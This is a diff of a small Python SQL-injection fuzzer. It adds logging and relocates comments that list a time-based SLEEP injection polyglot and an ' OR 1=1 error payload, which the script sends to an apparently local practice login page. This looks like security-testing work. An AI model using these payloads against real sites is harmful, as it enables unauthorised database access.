@@ -1,5 +1,15 @@
 import requests
 from bs4 import BeautifulSoup
+import logging
+
+logging.basicConfig(filename="logs/fuzzer.log", level=logging.DEBUG)
+fuzzer_logger = logging.getLogger("Tester")
+
+# Payloads:
+#     Injection: SLEEP(1)/*' or SLEEP(1) or \'\" or SLEEP(5) or \"*/
+#     Error: \' OR 1=1
+#     Normal: asdfgh
+
 
 def get_input_fields(URL):
 	"""
@@ -101,12 +111,6 @@ def payload_check(URL, payload):
 
 
 if __name__ == '__main__':
-
-    # Payloads:
-    #     Injection: SLEEP(1)/*' or SLEEP(1) or \'\" or SLEEP(5) or \"*/
-    #     Error: \' OR 1=1
-    #     Normal: asdfgh
-	print("aa")
 	URL = "http://localhost/bricks/login-1/index.php"
 	payload = "SLEEP(1)/*' or SLEEP(1) or \'\" or SLEEP(1) or \"*/"
 	print(payload_check(URL, payload))
